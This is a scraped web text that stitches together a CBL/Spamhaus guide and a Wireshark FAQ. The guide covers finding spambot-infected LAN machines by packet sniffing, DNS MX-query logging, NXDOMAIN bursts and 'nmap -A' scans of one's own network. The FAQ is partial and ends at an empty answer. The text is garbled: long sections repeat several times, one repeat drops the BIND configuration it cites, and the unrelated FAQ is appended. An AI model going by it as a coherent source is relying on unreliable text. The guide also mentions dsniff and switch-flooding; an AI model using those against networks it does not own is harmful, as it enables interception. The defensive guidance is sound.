If your computers are connected together with hubs, it's easy, install
wireshark on one of the computers "near" the NAT and just start sniffing.

If you're unsure as to whether the sniffer is going to work for you
in your network, install wireshark, and from another computer, do "something"
to the Internet.
If you can't see the network traffic in the sniffer, you probably have
a switched network.
[If you're unsure of what to look for, install tcpview
on a machine and see what Internet connections it has open.  The
sniffer should be able to "see" those connections on the wire.]

In a switched network, you somehow have to get a non-switched drop (for the
sniffer machine) connected to the LAN segment that talks to your external
Internet connection.  Eg: on the wire between the NAT device (perhaps
a discrete firewall or your ADSL modem) and the rest of your LAN.
It must be on the LAN side of the NAT.

If you're lucky, you have a "monitoring" or "mirror port" on your
switch, or some other way of making one of the switch ports open.
Just attach the sniffer machine there.

Without a monitor port,
another way of solving this is to find a "ethernet hub".
Which is a simple device with several RJ45 network connectors,
and often doesn't even have a power supply.
You can often find these in computer stores used parts bins, and even 
brand new
one should cost less than $20.
Just be sure it's an "ethernet hub", not an "ethernet switch".
If in doubt, ask the salesperson.  If the salesperson doesn't know,
check the Internet.
Connect the hub between your NAT and the rest of the network, then connect
your sniffer machine to one of the other hub ports.
This is the "hubbing out" diagram.


Note that if your NAT gateway is an integrated firewall/router this
can be problemmatic.
In such cases, you'll have to rely on firewall rules and logs instead
of a sniffer, or add a cheap switch (1Gb switches are < $40)
for all of your computers.
From the switch, you run a line to the hub, and from the hub
to your firewall/router, with the sniffer hanging off one of the hub
ports.


[This author has a Dlink wireless 4 port router (100Mb) implementing the
NAT connection to the Internet modem and wireless connections.
Only one of the Dlink's LAN ports is used - it connects to a 1000Mb
switch, where all the wired computers connect to.
This was cheaper than upgrading the wireless router to allow the higher speed
wired machines to talk at 1000Mb.
If a sniffer was necessary, it would be connected via an old 10Mb passive hub
between the switch and the router - no particular performance penalty, because
essentially the only traffic going through this link is to the Internet, and
the author's Internet connection isn't that fast.
This doesn't necessarily help sniff the wireless connections, however,
machines could be moved to wired connections for testing.]


There are network sniffers that can trick switches into behaving like hubs.
Eg: the "dsniff" sniffer - see the 
Capture using a MITM (Man-In-The-Middle) software for more detail.
Take special note of the warnings -
use with caution.

Command and Control Detection [MODERATE-HARD]

Spambots are controlled by criminals (botmasters)
in a variety of different ways,
which can be differentiated in the following ways based on who
connects to what, and how they can be detected:


The methods we describe below won't always be terribly useful, but
if you have a sniffer working properly, they won't take much time
to try, and you may get lucky.


Inbound control
is where there is a botmaster who
knows that a particular IP is infected, establishes a connection
to that IP address and uses a specialized bot control protocol to
"tell" the infected computer what to do.
This includes some BOTs and other things like "open proxies".

Behind a NAT firewall, these are generally not a big problem because
a computer on the Internet can't connect to an arbitrary computer
behind a NAT.
The NAT has to be explicitly configured to allow specific inbound
connections to internal machines (eg: mail and web servers).
So, normal "infected end-user machines" generally can't be controlled
this way.
This is the province of specialized infections like Darkmailer which
hacks into web servers and uses them as spam cannons.

More info TBD.

Outbound control
The majority of infestations the CBL detects are where the infected
computer makes long-lived or multiple short-lived connections to
a "command and control" (C&C) server somewhere in the Internet.
The C&C server replies to these connections with sets of instructions
of what to do (eg: contents of email, message templates, and lists
of email addresses to spam).

Many older BOTs (and a few current ones) use IRC - the infected computer
makes a connection to an IRC server, and the IRC server responds with
commands.
One BOT that does is called "MIRCbot".
If you have a sniffer, simply looking for IRC connections that you're
not expecting (port 6666) will find both the C&C and the infected computer.
As a best practise, it's usually best to block outbound IRC connections
at your firewall unless you have users that really need to use IRC.
The Instant Messaging protocols (eg: MSN, AOL/AIM, Yahoo and Jabber
based protocols) are generally not a problem in this way.


Newer BOTs use more sophisticated command and control protocols.
You have to know exactly which bot you're looking for, and be
deeply involved in the anti-virus research community to know exactly
what to look for.  In many cases, BOTs use random port numbers,
or "common" ones, so either you don't know "where" it is, or, it's mixed
in with lots of legitimate traffic, so you can't tell which connections
are good and which ones are bad.


All is not lost however.  With a sniffer, you can try looking for
outbound connections to unusually high numbered ports (eg: >10,000).
In small environments, you could get everyone to shut down their web
browsers, and watch for port 80, 8080, and 443 (all web based)
connections when they shouldn't be made.
If you find web connections when the source of the connection doesn't
have a browser or mail reader running, there's a good chance you've
found the infected machine - the machines to first run a toolkit
tool like tcpview on.


In a relatively small environment, you may get a "feeling" for the
IP addresses the sniffer is showing you as the destination.
Eg: if you're in North America, seeing connections to IP addreses
beginning with 200, 201, 202, 203, 59, 88, 89 etc, will mean that
the computer is making connections to Asia or Europe.  Especially
if the local computer is idle, why is it making connections there?
Again, a job for tcpview.


Odd DNS MX query sources [MODERATE-HARD]

To send email, virtually all BOTs have to issue DNS MX queries
to find how to deliver their spam/viruses.
Under normal circumstances, ONLY your mail server[s], your DNS server[s]
(if any) should be issuing MX queries.
Web servers that do direct-to-recipient emailing will do MX queries
too, but this is generally unwise, and you should force your web server's
email through your main mail server.


End user computers generally do NOT have to issue MX queries - they
just hand the email off to your mail server (by explicit "smarthost",
"relay", "smtp server" or "outbound mail server" settings),
which will require an A record but not MX record lookup).


This means that a BOT sending lots of spam will do lots of MX queries.
If you find a end-user computer or some other computer that shouldn't be
doing email at all doing MX queries (especially lots of them), you've found
the infected computer[s].


If you have your own DNS server (eg: a DNS cache), you should be
able to get the DNS server to give you basic statistics of who is
issuing MX queries to them.  If you don't have your own DNS server,
you could look for unusual sources of DNS MX queries via a sniffer.
It may be easier to sniff all DNS traffic going to your DNS server than
your firewall.


Note some BOTs undoubtably use their own DNS servers, and ignore your local
settings.
In which case, you'd have to be able to sniff all 
Internet-bound traffic looking for DNS traffic not coming from your DNS
cache.


Note: it's probably a good idea to configure your firewall
to only allow your DNS cache to send/receive DNS packets (UDP port 53)
to/from the Internet.
This has a number of benefits, including disabling some bots, and
completely disrupting DNS hijacking attacks, which are becoming a major
hazard on the Internet (phishing, man-in-the-middle bank account attacks etc).
This is fairly easy to do if you allocate most IPs via DHCP, but you
will have to remember to check the DNS server settings on your static IP
computers.
However, in large ad-hoc networks this may be impractical to implement - too
much work fixing computer DNS settings.


Configuring DNS servers to yield detailed per-IP metrics is beyond the scope
of this page.  See the documentation for your DNS server.
However, a team member provided this configuration snippet on how
to make BIND log queries:

logging {
        channel "logger" {
                file "/var/log/named.log" versions 3 size 5m;
                severity debug 5;
                print-time yes;
                print-category yes;
        };
        category queries {
                 "logger";
        };
};


This will log all (not just MX) queries in /var/log/named.log, example:

28-Jul-2009 15:07:09.206 queries: client 192.168.13.100#59889: query: somebody.com IN MX +


You could then issue "grep MX /var/log/named.log" and see if some
unexpected IP address is doing a lot of MX queries.
See BIND
for more information on logging options.

Lots of DNS NXDOMAINs [MODERATE-HARD]

Some BOTs (eg: Conficker) use DNS to periodically find their command-and-control
(C&C) servers.
In some cases, some of the C&Cs have been taken down, or, the BOT uses time-based
algorithms to compute the names before the domain name is registered.


As a consequence such BOTS will do DNS A record queries in bursts, and
often get a lot of "no such name" (NXDOMAIN) responses.
Lots of "NXDOMAIN" isn't normal behaviour, particularly for end-user computers.
This can most often be found if you have your own DNS server - see previous
section about setting up logging.

Port Scanners [EASY-MODERATE]

Back in the days before "outbound controlled BOTs",
port scanners were frequently used to scan your own computers to see
what ports are open.  In this way you could often find the port
on which the BOT was listening, or determine that the computer was
offering services it didn't need to, and turn them off.


Port scanners are of relatively little use with more
modern spambots - the infection is not listening for inbound
C&C connections, it makes the connections itself outbound.  Secondly,
with NATs, the C&C server couldn't reach the infected computer
anyway.


However, sometimes you get lucky.
Some bots have provisions for multiple C&C methods, or install
open proxies or..., these a port scanner can find.


The most common/popular port scanner is the venerable
Nmap tool.  It's free, and runs
on just about anything.


But first, two warnings: 


ONLY SCAN YOUR OWN MACHINES!
Scanning other people's computers is considered a hostile act,
and can result in complaints to your ISP or worse.
So don't even think about it.


You really only should use port scanners if you're the boss,
or part of your company's security or IT department.
It's a good idea to warn management or security first.
Sometimes issuing port scans will set off alarms and in some
unusual situations can cause processing disruptions.
Better that your colleague's response is "Oh that's just the port scan"
than "we're hacked, call the police!"



Detailed description of how to use nmap is well beyond the scope
of this paper.
For our purposes, the following command will do most of
what you want and be non-destructive - won't do any damage:
nmap -A [machine or network specification]


For machine specification, you can just give the machine's name.
To scan an entire network, say, all of 192.168.0.0-192.168.0.255,
use "192.168.0.0/24".

The above command will show what ports are open (and
thus listening), and usually what they're used for.
Most machines should only be listening on a few.  Listening
on ports >1024 and/or that don't have a "name" under SERVICE are
suspicious and require closer looking at.
Machines that shouldn't have a web server listening on ports
80, 8080 are worth looking at.
Machines that shouldn't be running services at all should
be looked at.
tcpview or "netstat -nap" can be used on the machine to find out
what's listening on that port.

End Notes

ARP packets are special low-level packets that
devices use to tell switches and other computers "where" they are.
Essentially, it says "Here I am, my MAC (hardware address of Ethernet
device) is X and my IP is Y".
A Network switch sees these packets coming in on one of its ports,
and assigns the MAC and IP to a specific port/wire/computer.
Then, when it sees a request to send a packet to that IP, it knows
which port/wire/computer to send it to.
These assignments are kept in the switch's "ARP cache".
ARP caches are of limited size.  So, if a device deliberately floods
it with lots of ARP packets with random faked MAC addresses, the ARP
cache overflows, and the switch can only continue operation by sending
every packet down every interface.




Without a monitor port,
another way of solving this is to find a "ethernet hub".
Which is a simple device with several RJ45 network connectors,
and often doesn't even have a power supply.
You can often find these in computer stores used parts bins, and even 
brand new
one should cost less than $20.
Just be sure it's an "ethernet hub", not an "ethernet switch".
If in doubt, ask the salesperson.  If the salesperson doesn't know,
check the Internet.
Connect the hub between your NAT and the rest of the network, then connect
your sniffer machine to one of the other hub ports.
This is the "hubbing out" diagram.

Note that if your NAT gateway is an integrated firewall/router this
can be problemmatic.
In such cases, you'll have to rely on firewall rules and logs instead
of a sniffer, or add a cheap switch (1Gb switches are < $40)
for all of your computers.
From the switch, you run a line to the hub, and from the hub
to your firewall/router, with the sniffer hanging off one of the hub
ports.

[This author has a Dlink wireless 4 port router (100Mb) implementing the
NAT connection to the Internet modem and wireless connections.
Only one of the Dlink's LAN ports is used - it connects to a 1000Mb
switch, where all the wired computers connect to.
This was cheaper than upgrading the wireless router to allow the higher speed
wired machines to talk at 1000Mb.
If a sniffer was necessary, it would be connected via an old 10Mb passive hub
between the switch and the router - no particular performance penalty, because
essentially the only traffic going through this link is to the Internet, and
the author's Internet connection isn't that fast.
This doesn't necessarily help sniff the wireless connections, however,
machines could be moved to wired connections for testing.]

There are network sniffers that can trick switches into behaving like hubs.
Eg: the "dsniff" sniffer - see the 
Capture using a MITM (Man-In-The-Middle) software for more detail.
Take special note of the warnings -
use with caution.

Spambots are controlled by criminals (botmasters)
in a variety of different ways,
which can be differentiated in the following ways based on who
connects to what, and how they can be detected:

The methods we describe below won't always be terribly useful, but
if you have a sniffer working properly, they won't take much time
to try, and you may get lucky.

Behind a NAT firewall, these are generally not a big problem because
a computer on the Internet can't connect to an arbitrary computer
behind a NAT.
The NAT has to be explicitly configured to allow specific inbound
connections to internal machines (eg: mail and web servers).
So, normal "infected end-user machines" generally can't be controlled
this way.
This is the province of specialized infections like Darkmailer which
hacks into web servers and uses them as spam cannons.

More info TBD.

More info TBD.

Many older BOTs (and a few current ones) use IRC - the infected computer
makes a connection to an IRC server, and the IRC server responds with
commands.
One BOT that does is called "MIRCbot".
If you have a sniffer, simply looking for IRC connections that you're
not expecting (port 6666) will find both the C&C and the infected computer.
As a best practise, it's usually best to block outbound IRC connections
at your firewall unless you have users that really need to use IRC.
The Instant Messaging protocols (eg: MSN, AOL/AIM, Yahoo and Jabber
based protocols) are generally not a problem in this way.

Newer BOTs use more sophisticated command and control protocols.
You have to know exactly which bot you're looking for, and be
deeply involved in the anti-virus research community to know exactly
what to look for.  In many cases, BOTs use random port numbers,
or "common" ones, so either you don't know "where" it is, or, it's mixed
in with lots of legitimate traffic, so you can't tell which connections
are good and which ones are bad.

All is not lost however.  With a sniffer, you can try looking for
outbound connections to unusually high numbered ports (eg: >10,000).
In small environments, you could get everyone to shut down their web
browsers, and watch for port 80, 8080, and 443 (all web based)
connections when they shouldn't be made.
If you find web connections when the source of the connection doesn't
have a browser or mail reader running, there's a good chance you've
found the infected machine - the machines to first run a toolkit
tool like tcpview on.

In a relatively small environment, you may get a "feeling" for the
IP addresses the sniffer is showing you as the destination.
Eg: if you're in North America, seeing connections to IP addreses
beginning with 200, 201, 202, 203, 59, 88, 89 etc, will mean that
the computer is making connections to Asia or Europe.  Especially
if the local computer is idle, why is it making connections there?
Again, a job for tcpview.

To send email, virtually all BOTs have to issue DNS MX queries
to find how to deliver their spam/viruses.
Under normal circumstances, ONLY your mail server[s], your DNS server[s]
(if any) should be issuing MX queries.
Web servers that do direct-to-recipient emailing will do MX queries
too, but this is generally unwise, and you should force your web server's
email through your main mail server.

End user computers generally do NOT have to issue MX queries - they
just hand the email off to your mail server (by explicit "smarthost",
"relay", "smtp server" or "outbound mail server" settings),
which will require an A record but not MX record lookup).

This means that a BOT sending lots of spam will do lots of MX queries.
If you find a end-user computer or some other computer that shouldn't be
doing email at all doing MX queries (especially lots of them), you've found
the infected computer[s].

If you have your own DNS server (eg: a DNS cache), you should be
able to get the DNS server to give you basic statistics of who is
issuing MX queries to them.  If you don't have your own DNS server,
you could look for unusual sources of DNS MX queries via a sniffer.
It may be easier to sniff all DNS traffic going to your DNS server than
your firewall.

Note some BOTs undoubtably use their own DNS servers, and ignore your local
settings.
In which case, you'd have to be able to sniff all 
Internet-bound traffic looking for DNS traffic not coming from your DNS
cache.

Note: it's probably a good idea to configure your firewall
to only allow your DNS cache to send/receive DNS packets (UDP port 53)
to/from the Internet.
This has a number of benefits, including disabling some bots, and
completely disrupting DNS hijacking attacks, which are becoming a major
hazard on the Internet (phishing, man-in-the-middle bank account attacks etc).
This is fairly easy to do if you allocate most IPs via DHCP, but you
will have to remember to check the DNS server settings on your static IP
computers.
However, in large ad-hoc networks this may be impractical to implement - too
much work fixing computer DNS settings.

Configuring DNS servers to yield detailed per-IP metrics is beyond the scope
of this page.  See the documentation for your DNS server.
However, a team member provided this configuration snippet on how
to make BIND log queries:

This will log all (not just MX) queries in /var/log/named.log, example:

You could then issue "grep MX /var/log/named.log" and see if some
unexpected IP address is doing a lot of MX queries.
See BIND
for more information on logging options.

Some BOTs (eg: Conficker) use DNS to periodically find their command-and-control
(C&C) servers.
In some cases, some of the C&Cs have been taken down, or, the BOT uses time-based
algorithms to compute the names before the domain name is registered.

As a consequence such BOTS will do DNS A record queries in bursts, and
often get a lot of "no such name" (NXDOMAIN) responses.
Lots of "NXDOMAIN" isn't normal behaviour, particularly for end-user computers.
This can most often be found if you have your own DNS server - see previous
section about setting up logging.

Back in the days before "outbound controlled BOTs",
port scanners were frequently used to scan your own computers to see
what ports are open.  In this way you could often find the port
on which the BOT was listening, or determine that the computer was
offering services it didn't need to, and turn them off.

Port scanners are of relatively little use with more
modern spambots - the infection is not listening for inbound
C&C connections, it makes the connections itself outbound.  Secondly,
with NATs, the C&C server couldn't reach the infected computer
anyway.

However, sometimes you get lucky.
Some bots have provisions for multiple C&C methods, or install
open proxies or..., these a port scanner can find.

The most common/popular port scanner is the venerable
Nmap tool.  It's free, and runs
on just about anything.

But first, two warnings: 


ONLY SCAN YOUR OWN MACHINES!
Scanning other people's computers is considered a hostile act,
and can result in complaints to your ISP or worse.
So don't even think about it.


You really only should use port scanners if you're the boss,
or part of your company's security or IT department.
It's a good idea to warn management or security first.
Sometimes issuing port scans will set off alarms and in some
unusual situations can cause processing disruptions.
Better that your colleague's response is "Oh that's just the port scan"
than "we're hacked, call the police!"



Detailed description of how to use nmap is well beyond the scope
of this paper.
For our purposes, the following command will do most of
what you want and be non-destructive - won't do any damage:
nmap -A [machine or network specification]


For machine specification, you can just give the machine's name.
To scan an entire network, say, all of 192.168.0.0-192.168.0.255,
use "192.168.0.0/24".

The above command will show what ports are open (and
thus listening), and usually what they're used for.
Most machines should only be listening on a few.  Listening
on ports >1024 and/or that don't have a "name" under SERVICE are
suspicious and require closer looking at.
Machines that shouldn't have a web server listening on ports
80, 8080 are worth looking at.
Machines that shouldn't be running services at all should
be looked at.
tcpview or "netstat -nap" can be used on the machine to find out
what's listening on that port.

End Notes

ARP packets are special low-level packets that
devices use to tell switches and other computers "where" they are.
Essentially, it says "Here I am, my MAC (hardware address of Ethernet
device) is X and my IP is Y".
A Network switch sees these packets coming in on one of its ports,
and assigns the MAC and IP to a specific port/wire/computer.
Then, when it sees a request to send a packet to that IP, it knows
which port/wire/computer to send it to.
These assignments are kept in the switch's "ARP cache".
ARP caches are of limited size.  So, if a device deliberately floods
it with lots of ARP packets with random faked MAC addresses, the ARP
cache overflows, and the switch can only continue operation by sending
every packet down every interface.




Detailed description of how to use nmap is well beyond the scope
of this paper.
For our purposes, the following command will do most of
what you want and be non-destructive - won't do any damage:
nmap -A [machine or network specification]


For machine specification, you can just give the machine's name.
To scan an entire network, say, all of 192.168.0.0-192.168.0.255,
use "192.168.0.0/24".

The above command will show what ports are open (and
thus listening), and usually what they're used for.
Most machines should only be listening on a few.  Listening
on ports >1024 and/or that don't have a "name" under SERVICE are
suspicious and require closer looking at.
Machines that shouldn't have a web server listening on ports
80, 8080 are worth looking at.
Machines that shouldn't be running services at all should
be looked at.
tcpview or "netstat -nap" can be used on the machine to find out
what's listening on that port.

End Notes

ARP packets are special low-level packets that
devices use to tell switches and other computers "where" they are.
Essentially, it says "Here I am, my MAC (hardware address of Ethernet
device) is X and my IP is Y".
A Network switch sees these packets coming in on one of its ports,
and assigns the MAC and IP to a specific port/wire/computer.
Then, when it sees a request to send a packet to that IP, it knows
which port/wire/computer to send it to.
These assignments are kept in the switch's "ARP cache".
ARP caches are of limited size.  So, if a device deliberately floods
it with lots of ARP packets with random faked MAC addresses, the ARP
cache overflows, and the switch can only continue operation by sending
every packet down every interface.




For machine specification, you can just give the machine's name.
To scan an entire network, say, all of 192.168.0.0-192.168.0.255,
use "192.168.0.0/24".
The above command will show what ports are open (and
thus listening), and usually what they're used for.
Most machines should only be listening on a few.  Listening
on ports >1024 and/or that don't have a "name" under SERVICE are
suspicious and require closer looking at.
Machines that shouldn't have a web server listening on ports
80, 8080 are worth looking at.
Machines that shouldn't be running services at all should
be looked at.
tcpview or "netstat -nap" can be used on the machine to find out
what's listening on that port.
© 2018 CBL. A Division of Spamhaus.  All rights reserved. | Privacy Policy | Terms and Conditions

1.1 What is Wireshark?

1.2 What's up with the name change?  Is Wireshark a fork?

1.3 Where can I get help?

1.4 What kind of shark is Wireshark?

1.5 How is Wireshark pronounced, spelled and capitalized?

1.6 How much does Wireshark cost?

1.7 But I just paid someone on eBay for a copy of Wireshark! Did I get ripped off?

1.8 Can I use Wireshark commercially?

1.9 Can I use Wireshark as part of my commercial product?

1.10 What protocols are currently supported?

1.11 Are there any plans to support {your favorite protocol}?

1.12 Can Wireshark read capture files from {your favorite network
analyzer}?

1.13 What devices can Wireshark use to capture packets?

1.14 
Does Wireshark work on Windows Vista or Windows Server 2008?


2.1 I installed the Wireshark RPM (or other package); why did
it install TShark but not Wireshark?

3.1 I have libpcap installed; why did the configure script not
find pcap.h or bpf.h?

3.2 
When I try to build Wireshark on Windows, why does the build fail because
of conflicts between winsock.h and winsock2.h?


4.1 When I try to run Wireshark, why does it complain about
sprint_realloc_objid being undefined?

4.2 
I've installed Wireshark from Fink on macOS; why is it very slow to
start up?


5.1 
I have an XXX network card on my machine; if I try to capture on it, why
does my machine crash or reset itself?


5.2 
Why does my machine crash or reset itself when I select "Start" from the
"Capture" menu or select "Preferences" from the "Edit" menu?


6.1 When I use Wireshark to capture packets, why do I see only
packets to and from my machine, or not see all the traffic I'm expecting
to see from or to the machine I'm trying to monitor?

6.2 When I capture with Wireshark, why can't I see any TCP
packets other than packets to and from my machine, even though another
analyzer on the network sees those packets?

6.3 Why am I only seeing ARP packets when I try to capture
traffic?

6.4 
Why am I not seeing any traffic when I try to capture traffic?

6.5 
Can Wireshark capture on (my T1/E1 line, SS7 links, etc.)?


6.6 How do I put an interface into promiscuous mode?

6.7 
I can set a display filter just fine; why don't capture filters work?


6.8 I'm entering valid capture filters; why do I still get
"parse error" errors?

6.9 
How can I capture packets with CRC errors?


6.10 
How can I capture entire frames, including the FCS?


6.11 
I'm capturing packets on a machine on a VLAN; why don't the packets I'm
capturing have VLAN tags?


6.12 
Why does Wireshark hang after I stop a capture?


7.1 
I'm running Wireshark on Windows; why does some network interface on my
machine not show up in the list of interfaces in the "Interface:" field
in the dialog box popped up by "Capture->Start", and/or why does
Wireshark give me an error if I try to capture on that interface?


7.2 
I'm running Wireshark on Windows; why do no network interfaces show up in
the list of interfaces in the "Interface:" field in the dialog box
popped up by "Capture->Start"?


7.3 
I'm running Wireshark on Windows; why doesn't my serial port/ADSL
modem/ISDN modem show up in the list of interfaces in the "Interface:"
field in the dialog box popped up by "Capture->Start"?


7.4 
I'm running Wireshark on Windows NT 4.0/Windows 2000/Windows XP/Windows
Server 2003; my machine has a PPP (dial-up POTS, ISDN, etc.) interface,
and it shows up in the "Interface" item in the "Capture Options" dialog
box.  Why can no packets be sent on or received from that network while
I'm trying to capture traffic on that interface?

7.5 
I'm running Wireshark on Windows; why am I not seeing any traffic being
sent by the machine running Wireshark?

7.6 
When I capture on Windows in promiscuous mode, I can see packets other
than those sent to or from my machine; however, those packets show up
with a "Short Frame" indication, unlike packets to or from my machine.
What should I do to arrange that I see those packets in their entirety?


7.7 
I'm trying to capture 802.11 traffic on Windows; why am I not seeing any
packets?


7.8 
I'm trying to capture 802.11 traffic on Windows; why am I seeing packets
received by the machine on which I'm capturing traffic, but not packets
sent by that machine?


7.9 
I'm trying to capture Ethernet VLAN traffic on Windows, and I'm
capturing on a "raw" Ethernet device rather than a "VLAN interface", so
that I can see the VLAN headers; why am I seeing packets received by the
machine on which I'm capturing traffic, but not packets sent by that
machine?


8.1 
I'm running Wireshark on a UNIX-flavored OS; why does some network
interface on my machine not show up in the list of interfaces in the
"Interface:" field in the dialog box popped up by "Capture->Start",
and/or why does Wireshark give me an error if I try to capture on that
interface? 

8.2 
I'm running Wireshark on a UNIX-flavored OS; why do no network interfaces
show up in the list of interfaces in the "Interface:" field in the
dialog box popped up by "Capture->Start"?


8.3 I'm capturing packets on Linux; why do the time stamps have
only 100ms resolution, rather than 1us resolution?

9.1 
How can I capture raw 802.11 frames, including non-data (management,
beacon) frames?


9.2 
How do I capture on an 802.11 device in monitor mode?

10.1 Why am I seeing lots of packets with incorrect TCP checksums?

10.2 
I've just installed Wireshark, and the traffic on my local LAN
is boring.  Where can I find more interesting captures?


10.3 
Why doesn't Wireshark correctly identify RTP packets? It shows them
only as UDP.

10.4 
Why doesn't Wireshark show Yahoo Messenger packets in captures that
contain Yahoo Messenger traffic?

11.1 I saved a filter and tried to use its name to filter the
display; why do I get an "Unexpected end of filter string" error?

11.2 
How can I search for, or filter, packets that have a particular string
anywhere in them?


11.3 
How do I filter a capture to see traffic for virus XXX?


Q 1.1: What is Wireshark?

A:


Wireshark® is a network protocol analyzer. It lets you capture and
interactively browse the traffic running on a computer network.  It has
a rich and powerful feature set and is world's most popular tool of its
kind. It runs on most computing platforms including Windows, macOS,
Linux, and UNIX. Network professionals, security experts, developers,
and educators around the world use it regularly. It is freely available
as open source, and is released under the GNU General Public License
version 2.



It is developed and maintained by a global team of protocol experts, and
it is an example of a
disruptive
technology.



Wireshark used to be known as Ethereal®.  See the next question
for details about the name change.  If you're still using Ethereal, it
is strongly recommended that you upgrade to Wireshark as Ethereal is
unsupported and has known security vulnerabilities.



For more information, please see the
About Wireshark
page.


Q 1.2: What's up with the name change?  Is Wireshark a fork?

A:


In May of 2006, Gerald Combs (the original author of Ethereal)
went to work for CACE Technologies (best known for WinPcap).
Unfortunately, he had to leave the Ethereal trademarks behind.



This left the project in an awkward position.  The only reasonable way
to ensure the continued success of the project was to change the name.
This is how Wireshark was born.



Wireshark is almost (but not quite) a fork. Normally a "fork" of an open source
project results in two names, web sites, development teams, support
infrastructures, etc. This is the case with Wireshark except for one notable
exception -- every member of the core development team is now working on
Wireshark. There has been no active development on Ethereal since the name
change. Several parts of the Ethereal web site (such as the mailing lists,
source code repository, and build farm) have gone offline.



More information on the name change can be found here:


Q 1.3: Where can I get help?

A:


Community support is available on the
Q&A site and on the
wireshark-users mailing list.  Subscription information and archives for
all of Wireshark's mailing lists can be found at https://www.wireshark.org/mailman/listinfo.  An IRC channel
dedicated to Wireshark can be found at irc://irc.freenode.net/wireshark.



Self-paced and instructor-led training is available at Wireshark University.
Wireshark University also offers certification via the Wireshark
Certified Network Analyst program.



Q 1.4: What kind of shark is Wireshark?

A:
carcharodon photoshopia.


Q 1.5: How is Wireshark pronounced, spelled and capitalized?

A:


Wireshark is pronounced as the word wire followed immediately by
the word shark.  Exact pronunciation and emphasis may vary
depending on your locale (e.g. Arkansas).



It's spelled with a capital W, followed by a lower-case
ireshark.  It is not a CamelCase word, i.e., WireShark
is incorrect.



Q 1.6: How much does Wireshark cost?

A:


Wireshark is "free software"; you can download it without paying any
license fee.  The version of Wireshark you download isn't a "demo"
version, with limitations not present in a "full" version; it
is the full version.



The license under which Wireshark is issued is the GNU General Public
License version 2.  See the GNU
GPL FAQ for some more information.


Q 1.7: But I just paid someone on eBay for a copy of Wireshark! Did I get ripped off?

A:


That depends. Did they provide any sort of value-added product or service, such
as installation support, installation media, training, trace file analysis, or
funky-colored shark-themed socks? Probably not.



Wireshark is available for
anyone to download, absolutely free, at any time. Paying for a copy implies
that you should get something for your money.


Q 1.8: Can I use Wireshark commercially?

A:


Yes, if, for example, you mean "I work for a commercial organization;
can I use Wireshark to capture and analyze network traffic in our
company's networks or in our customer's networks?"



If you mean "Can I use Wireshark as part of my commercial product?", see
the next entry in the FAQ.



Q 1.9: Can I use Wireshark as part of my commercial product?

A:


As noted, Wireshark is licensed under the GNU General Public
License, version 2. The GPL imposes conditions on your use of GPL'ed
code in your own products; you cannot, for example, make a "derived
work" from Wireshark, by making modifications to it, and then sell the
resulting derived work and not allow recipients to give away the
resulting work. You must also make the changes you've made to the
Wireshark source available to all recipients of your modified version;
those changes must also be licensed under the terms of the GPL. See the
GPL
FAQ for more details; in particular, note the answer to the
question about modifying a GPLed program and selling it
commercially, and the
question about linking GPLed code with other code to make a proprietary
program.



You can combine a GPLed program such as Wireshark and a commercial
program as long as they communicate "at arm's length", as per this
item in the GPL FAQ.



We recommend keeping Wireshark and your product completely separate,
communicating over sockets or pipes. If you're loading any part of
Wireshark as a DLL, you're probably doing it wrong.


Q 1.10: What protocols are currently supported?

A:


There are currently hundreds of supported
protocols and media.  Details can be found in the
wireshark(1)
man page.


Q 1.11: Are there any plans to support {your favorite protocol}?

A:


Support for particular protocols is added to Wireshark as a result of
people contributing that support; no formal plans for adding support for
particular protocols in particular future releases exist.


Q 1.12: Can Wireshark read capture files from {your favorite network
analyzer}?

A:


Support for particular capture file formats is added to Wireshark as a result
of people contributing that support; no formal plans for adding support for
particular capture file formats in particular future releases exist.



If a network analyzer writes out files in a format already supported by
Wireshark (e.g., in libpcap format), Wireshark may already be able to read
them, unless the analyzer has added its own proprietary extensions to
that format.



If a network analyzer writes out files in its own format, or has added
proprietary extensions to another format, in order to make Wireshark read
captures from that network analyzer, we would either have to have a
specification for the file format, or the extensions, sufficient to give
us enough information to read the parts of the file relevant to
Wireshark, or would need at least one capture file in that format
AND a detailed textual analysis of the packets in that
capture file (showing packet time stamps, packet lengths, and the
top-level packet header) in order to reverse-engineer the file
format.



Note that there is no guarantee that we will be able to reverse-engineer
a capture file format.


Q 1.13: What devices can Wireshark use to capture packets?

A:


Wireshark can read live data from Ethernet, Token-Ring, FDDI, serial (PPP
and SLIP) (if the OS on which it's running allows Wireshark to do so),
802.11 wireless LAN (if the OS on which it's running allows Wireshark to
do so), ATM connections (if the OS on which it's running allows Wireshark
to do so), and the "any" device supported on Linux by recent versions of
libpcap.



See the list of
supported capture media on various OSes for details (several items
in there say "Unknown", which doesn't mean "Wireshark can't capture on
them", it means "we don't know whether it can capture on them"; we
expect that it will be able to capture on many of them, but we haven't
tried it ourselves - if you try one of those types and it works, please
update the wiki page accordingly.



It can also read a variety of capture file formats, including:


so that it can read traces from various network types, as captured by
other applications or equipment, even if it cannot itself capture on
those network types.


Q 1.14: 
Does Wireshark work on Windows Vista or Windows Server 2008?


A:


Yes, but if you want to capture packets as a normal user, you must make sure
npf.sys is loaded. Wireshark's installer enables this by default. This is not a
concern if you run Wireshark as Administrator, but this is discouraged. See the
CapturePrivileges
page on the wiki for more details.


Q 2.1: I installed the Wireshark RPM (or other package); why did
it install TShark but not Wireshark?

A:


Many distributions have separate Wireshark packages, one for non-GUI
components such as TShark, editcap, dumpcap, etc. and one for the GUI.
If this is the case on your system, there's probably a separate package
named wireshark-qt.  Find it and install it.


Q 3.1: I have libpcap installed; why did the configure script not
find pcap.h or bpf.h?

A:


Are you sure pcap.h and bpf.h are installed?  The official distribution
of libpcap only installs the libpcap.a library file when "make install"
is run.  To install pcap.h and bpf.h, you must run "make install-incl".
If you're running Debian or Redhat, make sure you have the "libpcap-dev"
or "libpcap-devel" packages installed.



It's also possible that pcap.h and bpf.h have been installed in a strange
location.  If this is the case, you may have to tweak aclocal.m4.


Q 3.2: 
When I try to build Wireshark on Windows, why does the build fail because
of conflicts between winsock.h and winsock2.h?


A:


As of Wireshark 0.9.5, you must install WinPcap 2.3 or later, and the
corresponding version of the developer's pack, in order to be able to
compile Wireshark; it will not compile with older versions of the
developer's pack.  The symptoms of this failure are conflicts between
definitions in winsock.h and in winsock2.h; Wireshark
uses winsock2.h, but pre-2.3 versions of the WinPcap
developer's packet use winsock.h.  (2.3 uses
winsock2.h, so if Wireshark were to use winsock.h, it
would not be able to build with current versions of the WinPcap
developer's pack.)



Note that the installed version of the developer's pack should be the
same version as the version of WinPcap you have installed.


Q 4.1: When I try to run Wireshark, why does it complain about
sprint_realloc_objid being undefined?

A:


